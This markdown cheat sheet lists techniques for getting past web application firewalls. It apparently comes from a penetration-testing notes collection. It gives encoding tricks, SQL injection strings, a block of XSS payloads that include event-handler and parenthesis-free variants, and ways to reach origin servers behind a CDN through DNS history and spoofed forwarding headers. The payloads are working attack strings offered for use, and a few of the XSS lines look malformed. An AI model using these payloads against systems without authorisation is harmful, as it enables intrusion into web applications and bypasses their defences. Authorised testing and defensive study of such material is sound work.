# WAF Bypass Techniques

## General Techniques

- [ ] Try different HTTP methods (GET vs POST vs PUT)
- [ ] Try changing `Content-Type` (e.g., `application/json` → `application/x-www-form-urlencoded` → `multipart/form-data`)
- [ ] Try HTTP/1.0 instead of HTTP/1.1
- [ ] Try chunked transfer encoding
- [ ] Try adding junk parameters or headers to confuse the WAF
- [ ] Try request smuggling if applicable

## Encoding Bypasses

| Technique            | Example                  |
| -------------------- | ------------------------ |
| URL encoding         | `%27` for `'`            |
| Double URL encoding  | `%2527` for `'`          |
| Unicode encoding     | `%u0027` for `'`         |
| HTML entity encoding | `&#x27;` for `'`         |
| Mixed case           | `SeLeCt`, `ScRiPt`       |
| Null bytes           | `%00` between characters |
| Overlong UTF-8       | `%c0%27`                 |

## [SQL Injection](sql-injection.md) WAF Bypass

```
/*!50000SELECT*/ @@version   -- MySQL version-specific comment
SEL/**/ECT                    -- inline comment splitting
CONCAT(0x73656C656374)        -- hex encoding
' OR 1=1--                    -- basic, but try with encoding
%55nion(%53elect)             -- partial URL encoding
```

## [XSS](xss.md) WAF Bypass

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<body onload=alert(1)>
<marquee onstart=alert(1)>
```

### JavaScript without parentheses

```html
<img src="x" onerror="alert`1`" />
<svg onload="location" ="javascript:alert\x281\x29">
  <svg onload="window.onerror" ="alert;throw+1"></svg>
</svg>
```

### Tag/event enumeration

If specific tags or events are blocked, fuzz for allowed combinations using Burp Intruder or similar.

## IP-Based Bypass

- [ ] Try accessing the origin server directly (bypass CDN/WAF)
  - Check DNS history (SecurityTrails, ViewDNS)
  - Check for IP leaks in email headers, error pages, etc.
- [ ] Try `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP` headers with internal IPs

## Cloudflare-Specific

- [ ] Check for origin IP via historical DNS records
- [ ] Check `Censys`, `Shodan` for exposed origin
- [ ] Try accessing via IPv6 if WAF only protects IPv4

## Tools

- [wafw00f](https://github.com/EnableSecurity/wafw00f) - WAF fingerprinting
- [bypass-403](https://github.com/iamj0ker/bypass-403) - 403 bypass techniques

---

## References

- [PayloadsAllTheThings - WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks - WAF Bypass](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/waf-bypass.html)
